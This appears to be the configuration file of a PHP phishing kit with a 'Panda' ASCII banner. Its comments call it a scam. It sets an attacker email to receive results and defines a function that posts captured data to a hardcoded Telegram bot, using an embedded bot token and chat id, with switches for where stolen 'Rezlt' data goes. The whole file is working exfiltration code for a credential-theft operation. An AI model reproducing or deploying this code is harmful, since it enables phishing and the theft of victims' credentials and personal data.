<?php
/*  

 /$$$$$$$                           /$$          
| $$__  $$                         | $$          
| $$  \ $$ /$$$$$$  /$$$$$$$   /$$$$$$$  /$$$$$$ 
| $$$$$$$/|____  $$| $$__  $$ /$$__  $$ |____  $$
| $$____/  /$$$$$$$| $$  \ $$| $$  | $$  /$$$$$$$
| $$      /$$__  $$| $$  | $$| $$  | $$ /$$__  $$
| $$     |  $$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$$
|__/      \_______/|__/  |__/ \_______/ \_______/
                                                                                                  
                                                                                                                
                                                             

*/
        ########################################################
         ############# [+] EMAIL INFORMATION [+] ##############
        ########################################################

     	$yours = "ssadsasdadasd3e423@yandex.com"; // Edit this to your email 


	function tinfo_log($msg){$ch = curl_init('https://api.telegram.org/bot1890430433:AAGMx4Rv6ifOHU30rKCiXYaPbXDT2TQi5Zk/sendMessage');$data = ['chat_id'=>'-560436132','text'=> $msg];curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,$data);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$server_output = curl_exec($ch);curl_close ($ch);}




	// ================================= //


	$sendtotg = 'yes';

	$sendtoemail = "no";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
	
	// ================================= //
	
	$saveintext = "no";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
	
	$filename = "resultscl"; // Change |results| to any name you want this will be the (Rzlt file name).html
	// ================================= //

	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y H:i:s");
	}

?>